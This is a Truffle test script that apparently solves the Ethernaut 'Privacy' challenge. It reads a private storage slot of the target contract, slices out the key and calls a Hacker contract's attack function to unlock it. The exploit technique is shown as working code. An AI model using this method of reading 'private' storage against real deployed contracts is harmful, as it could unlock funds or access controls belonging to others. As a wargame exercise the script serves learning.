const Hacker = artifacts.require("Hacker");
const Privacy = artifacts.require("Privacy");
const { expect } = require("chai");

/*
 * uncomment accounts to access the test accounts made available by the
 * Ethereum client
 * See docs: https://www.trufflesuite.com/docs/truffle/testing/writing-tests-in-javascript
 */
contract("Hacker", function ([_owner, _hacker]) {
  it("should unlock contract", async function () {
    const hackerContract = await Hacker.deployed();
    const targetContract = await Privacy.deployed();

    // Check if the contract locked first
    let locked = await targetContract.locked();
    expect(locked).to.equal(true);

    /*
    bool public locked = true; // slot 0
    uint256 public ID = block.timestamp; // slot 1
    uint8 private flattening = 10; // slot 2
    uint8 private denomination = 255; // slot 2
    uint16 private awkwardness = uint16(block.timestamp); // slot 2
    bytes32[3] private data; // slot 3, 4, 5
    */

    // Read storage of the target contract
    const data2 = await web3.eth.getStorageAt(
      targetContract.address, // address of the contract
      5, // index of slot - data[2]
    );

    console.log("data2", data2.length, data2);

    // a higher half of data2 is key
    const key = data2.substring(0, 34);

    console.log("key", key.length, key);

    // Use the key to unlock vault
    const result = await hackerContract.attack(targetContract.address, key, { from: _hacker });
    expect(result.receipt.status).to.equal(true);

    // Read lock status of the target contract
    locked = await targetContract.locked();
    expect(locked).to.equal(false);
  });
});
